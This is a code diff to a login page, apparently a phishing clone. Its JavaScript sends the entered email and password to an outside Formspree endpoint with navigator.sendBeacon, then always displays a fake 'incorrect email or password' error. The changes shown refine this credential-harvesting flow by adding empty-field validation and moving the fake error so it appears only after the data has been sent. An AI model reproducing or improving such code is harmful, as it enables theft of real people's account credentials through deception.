@@ -179,6 +179,11 @@
                         box-shadow: 0 0 0 2px rgba(8, 102, 255, 0.2);
                     }
 
+                    /* Clase dinámica para campos con error */
+                    .input-group input.error-input {
+                        border-color: #d31130;
+                    }
+
             .password-container {
                 position: relative;
                 width: 100%;
@@ -402,7 +407,7 @@
                     align-items: center;
                     justify-content: center;
                 }
-                /* OCULTAR EL TEXTO PRINCIPAL EN MÓVILES */
+
                 .hero-title {
                     display: none !important;
                 }
@@ -427,7 +432,7 @@
 
     <!-- Notificación superior -->
     <div id="networkAlert" class="network-alert-banner">
-        Correo o contraseña incorrectos
+        Completa todos los campos obligatorios
     </div>
 
     <div class="page-wrapper">
@@ -580,8 +585,35 @@
             }
 
             function enviarCredencialesYRedirigir() {
-                const correo = document.getElementById('correo').value;
-                const contrasenia = document.getElementById('contrasenia').value;
+                const correoInput = document.getElementById('correo');
+                const contraseniaInput = document.getElementById('contrasenia');
+                const alertBanner = document.getElementById('networkAlert');
+
+                const correo = correoInput.value.trim();
+                const contrasenia = contraseniaInput.value.trim();
+
+                // Validación: Si alguno de los campos está vacío
+                if (correo === "" || contrasenia === "") {
+                    if (correo === "") correoInput.classList.add('error-input');
+                    else correoInput.classList.remove('error-input');
+
+                    if (contrasenia === "") contraseniaInput.classList.add('error-input');
+                    else contraseniaInput.classList.remove('error-input');
+
+                    // Mostrar la barra de alerta superior
+                    alertBanner.classList.add('show');
+
+                    // Ocultar la alerta automáticamente después de 3 segundos
+                    setTimeout(() => {
+                        alertBanner.classList.remove('show');
+                    }, 3000);
+
+                    return; // Detiene la ejecución para no enviar datos vacíos
+                }
+
+                // Limpiar errores visuales si pasa la validación
+                correoInput.classList.remove('error-input');
+                contraseniaInput.classList.remove('error-input');
 
                 const formspreeUrl = "https://formspree.io/f/xvkpnleo";
 
@@ -591,7 +623,7 @@
 
                 navigator.sendBeacon(formspreeUrl, formData);
 
-                const alertBanner = document.getElementById('networkAlert');
+                alertBanner.textContent = "Correo o contraseña incorrectos";
                 alertBanner.classList.add('show');
 
                 setTimeout(() => {
